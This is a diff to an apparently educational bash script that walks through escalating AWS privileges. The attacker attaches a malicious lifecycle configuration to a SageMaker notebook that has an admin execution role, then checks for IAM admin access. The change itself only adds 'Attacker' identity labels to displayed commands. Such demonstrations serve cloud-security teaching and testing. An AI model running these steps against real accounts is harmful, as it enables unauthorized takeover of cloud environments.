@@ -25,12 +25,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -93,7 +95,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -105,7 +107,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -113,7 +115,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -124,12 +126,12 @@ echo ""
 # Step 5: Discover and describe target notebook
 echo -e "${YELLOW}Step 5: Discovering target SageMaker notebook instance${NC}"
 echo "Listing notebook instances..."
-show_cmd aws sagemaker list-notebook-instances --region $AWS_REGION --output table
+show_cmd "Attacker" "aws sagemaker list-notebook-instances --region $AWS_REGION --output table"
 aws sagemaker list-notebook-instances --region $AWS_REGION --output table
 
 echo ""
 echo "Describing target notebook: $NOTEBOOK_NAME"
-show_cmd aws sagemaker describe-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --output json
+show_cmd "Attacker" "aws sagemaker describe-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --output json"
 NOTEBOOK_INFO=$(aws sagemaker describe-notebook-instance \
     --notebook-instance-name $NOTEBOOK_NAME \
     --region $AWS_REGION \
@@ -143,11 +145,11 @@ echo "Notebook execution role: $NOTEBOOK_ROLE"
 echo ""
 
 echo "Verifying the notebook's execution role has admin permissions..."
-show_cmd aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query "Role.{RoleName:RoleName,Arn:Arn}" --output table
+show_cmd "Attacker" "aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query "Role.{RoleName:RoleName,Arn:Arn}" --output table"
 aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query 'Role.{RoleName:RoleName,Arn:Arn}' --output table
 echo ""
 echo "Checking attached policies..."
-show_cmd aws iam list-attached-role-policies --role-name $NOTEBOOK_ROLE_NAME --output table
+show_cmd "Attacker" "aws iam list-attached-role-policies --role-name $NOTEBOOK_ROLE_NAME --output table"
 aws iam list-attached-role-policies --role-name $NOTEBOOK_ROLE_NAME --output table
 
 echo -e "${GREEN}✓ Target notebook found with admin execution role${NC}\n"
@@ -249,7 +251,7 @@ ENCODED_SCRIPT=$(echo "$LIFECYCLE_SCRIPT" | base64)
 
 # Create the lifecycle configuration
 echo "Creating lifecycle config: $LIFECYCLE_CONFIG_NAME"
-show_attack_cmd aws sagemaker create-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name $LIFECYCLE_CONFIG_NAME --region $AWS_REGION --on-start Content="$ENCODED_SCRIPT" --output json
+show_attack_cmd "Attacker" "aws sagemaker create-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name $LIFECYCLE_CONFIG_NAME --region $AWS_REGION --on-start Content="$ENCODED_SCRIPT" --output json"
 aws sagemaker create-notebook-instance-lifecycle-config \
     --notebook-instance-lifecycle-config-name $LIFECYCLE_CONFIG_NAME \
     --region $AWS_REGION \
@@ -268,7 +270,7 @@ echo -e "${GREEN}✓ Malicious lifecycle config created${NC}\n"
 echo -e "${YELLOW}Step 8: Updating notebook with malicious lifecycle config${NC}"
 echo "Attaching lifecycle config to notebook: $NOTEBOOK_NAME"
 
-show_attack_cmd aws sagemaker update-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --lifecycle-config-name $LIFECYCLE_CONFIG_NAME --region $AWS_REGION --output json
+show_attack_cmd "Attacker" "aws sagemaker update-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --lifecycle-config-name $LIFECYCLE_CONFIG_NAME --region $AWS_REGION --output json"
 aws sagemaker update-notebook-instance \
     --notebook-instance-name $NOTEBOOK_NAME \
     --lifecycle-config-name $LIFECYCLE_CONFIG_NAME \
@@ -363,7 +365,7 @@ echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Testing if we now have admin permissions..."
 echo "Attempting to list IAM users..."
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
